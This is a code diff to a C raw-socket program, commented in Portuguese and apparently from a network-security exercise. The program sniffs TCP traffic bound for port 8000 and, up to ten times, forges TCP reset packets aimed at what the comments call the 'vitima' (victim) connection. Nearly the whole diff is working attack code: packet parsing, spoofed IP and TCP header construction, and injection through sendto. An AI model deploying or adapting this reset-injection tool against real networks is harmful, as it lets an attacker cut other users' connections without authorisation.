@@ -38,7 +38,7 @@ int main(int argc, char *argv[]){
 	short int ethertype = htons(0x0800);
 	int i, j, size, packet_size;
 	int frame_len = 0;
-	int sniffer_done = 0;
+	int num_envios = 0;
 	unsigned char buffer_in[BUFFER_SIZE];
 	unsigned char buffer_out[BUFFER_SIZE];
 	unsigned char ip_prot = 0;
@@ -119,25 +119,39 @@ int main(int argc, char *argv[]){
 	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	socket_address.sll_halen = ETH_ALEN;
 
-	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && sniffer_done == 0){
+	 while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0 && num_envios < 10){
 //	while ((size = read(fd, buffer_in, BUFFER_SIZE)) > 0){
 
-		if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
-			for(i=6;i<12;i++) {
-				mac_dst[i-6] = buffer_in[i];
-			}
+		// if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
+		// 	for(i=6;i<12;i++) {
+		// 		mac_dst[i-6] = buffer_in[i];
+		// 	}
 			ip_prot = buffer_in[IP_OFFSET+9];
-			for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
-				ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
-			}
-			for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
-				ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
-			}
-			port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
-			port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
-			seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
-			ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
+			// for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
+			// 	ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
+			// }
+			// for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
+			// 	ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
+			// }
+			// port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
+			// port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
+			// seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
+			// ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
 			if( ip_prot == 0x06 ) {		// TCP
+				if(buffer_in[12] == 0x08 && buffer_in[13] == 0x00) {
+					for(i=6;i<12;i++) {
+						mac_dst[i-6] = buffer_in[i];
+					}
+				for (i = IP_OFFSET+12; i < IP_OFFSET+16; i++){
+					ip_dst[i-(IP_OFFSET+12)] = buffer_in[i];
+				}
+				for (i = IP_OFFSET+16; i < IP_OFFSET+20; i++) {
+					ip_src[i-(IP_OFFSET+16)] = buffer_in[i];
+				}
+				port_src = buffer_in[TCP_OFFSET]<<8 | buffer_in[TCP_OFFSET+1];
+				port_dst = buffer_in[TCP_OFFSET+2]<<8 | buffer_in[TCP_OFFSET+3];
+				seq = buffer_in[TCP_OFFSET+4]<<24 | buffer_in[TCP_OFFSET+5]<<16 | buffer_in[TCP_OFFSET+6]<<8 | buffer_in[TCP_OFFSET+7];
+				ack = buffer_in[TCP_OFFSET+8]<<24 | buffer_in[TCP_OFFSET+9]<<16 | buffer_in[TCP_OFFSET+10]<<8 | buffer_in[TCP_OFFSET+11];
 				printf("\nIP HEADER:\n");
 				printf("    IP source: ");
 				for (j=0; j<4; j++){
@@ -153,23 +167,22 @@ int main(int argc, char *argv[]){
 				printf("\n    ACK: %x", ack);
 				printf("\n    SEQ: %x", seq);
 				printf("\n");
-				if( port_dst = port_server ) { // Se o destino eh a porta do server, a porta de origem eh a da vitima.
-					port_vitima = port_src;
-					sniffer_done = 1;
-
+				// if( port_dst == port_server ) { // Se o destino eh a porta do server, a porta de origem eh a da vitima.
+					// num_envios += 1;
+				if( port_dst == 0x1f40 ) {
 					eh->ether_dhost[0] = mac_dst[0];
 					eh->ether_dhost[1] = mac_dst[1];
-			        eh->ether_dhost[2] = mac_dst[2];
-			        eh->ether_dhost[3] = mac_dst[3];
-			        eh->ether_dhost[4] = mac_dst[4];
-			        eh->ether_dhost[5] = mac_dst[5];
+			    eh->ether_dhost[2] = mac_dst[2];
+			    eh->ether_dhost[3] = mac_dst[3];
+			    eh->ether_dhost[4] = mac_dst[4];
+			    eh->ether_dhost[5] = mac_dst[5];
 					socket_address.sll_addr[0] = mac_dst[0];
-			        socket_address.sll_addr[1] = mac_dst[1];
-			        socket_address.sll_addr[2] = mac_dst[2];
-			        socket_address.sll_addr[3] = mac_dst[3];
-			        socket_address.sll_addr[4] = mac_dst[4];
-			        socket_address.sll_addr[5] = mac_dst[5];
-                    frame_len += sizeof(struct ether_header);
+			    socket_address.sll_addr[1] = mac_dst[1];
+			    socket_address.sll_addr[2] = mac_dst[2];
+			    socket_address.sll_addr[3] = mac_dst[3];
+			    socket_address.sll_addr[4] = mac_dst[4];
+			    socket_address.sll_addr[5] = mac_dst[5];
+          frame_len += sizeof(struct ether_header);
 
 					packet_size = (sizeof(struct ip) + sizeof(struct tcphdr));
 					iphdr->ip_v = 4;
@@ -178,33 +191,47 @@ int main(int argc, char *argv[]){
 					iphdr->ip_off = 0;
 					iphdr->ip_ttl = IPDEFTTL;
 					iphdr->ip_p = IPPROTO_TCP;
+
+					// iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
+					// iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_src.s_addr = ip_src[3]<<24 | ip_src[2]<<16 | ip_src[1]<<8 | ip_src[0];
 					iphdr->ip_dst.s_addr = ip_dst[3]<<24 | ip_dst[2]<<16 | ip_dst[1]<<8 | ip_dst[0];
 					iphdr->ip_sum = (unsigned short)in_cksum((unsigned short *)iphdr, sizeof(struct ip));
 					frame_len += sizeof(struct ip);
 
-        	        tcp->th_dport = htons(port_src);
-	                tcp->th_sport = htons(port_server);
-	                tcp->th_seq = htonl(ack);
+        	tcp->th_dport = htons(port_src);
+	        tcp->th_sport = htons(port_server);
+	        tcp->th_seq = htonl(ack);
 					tcp->th_ack = 0;
-           	        tcp->th_off = 5;
+          tcp->th_off = 5;
 					// tcp->th_flags = TH_ACK | TH_RST;
 					tcp->th_flags = TH_RST | TH_PUSH;
-	            	tcp->th_win = htons(1200);
-	       	        tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
+					// tcp->th_flags = TH_RST;
+	        tcp->th_win = htons(1200);
+	       	tcp->th_sum = trans_check(IPPROTO_TCP, packet, sizeof(struct tcphdr), iphdr->ip_src, iphdr->ip_dst);
 					frame_len += sizeof(struct tcphdr);
 
 
 					/* Envia pacote */
-					if (sendto(fd, packet, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
-						perror("send");
-						close(fd);
-						exit(1);
+					/* Garante que nao enviamos para o server
+					** (port_src deve ser o da vitima, ja que so "interceptamos" pacotes destinando o server...) */
+					if( tcp->th_dport == htons(port_src) ) {
+						if (sendto(fd, packet, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+							perror("send");
+							close(fd);
+							exit(1);
+						}
+						printf("Pacote de TCP reset enviado.\n");
+						// memset(packet,0,BUFFER_SIZE);
+						// memset(buffer_in,0,BUFFER_SIZE);
+						port_src = 0;
+						port_dst = 0;
+						ack = 0;
+						seq = 0;
+            frame_len = 0;
+						num_envios++;
 					}
-					printf("Pacote de TCP reset enviado.\n");
-                    frame_len = 0;
 			}
-			// Send the reset packet to client
 		}
 		}
 	}
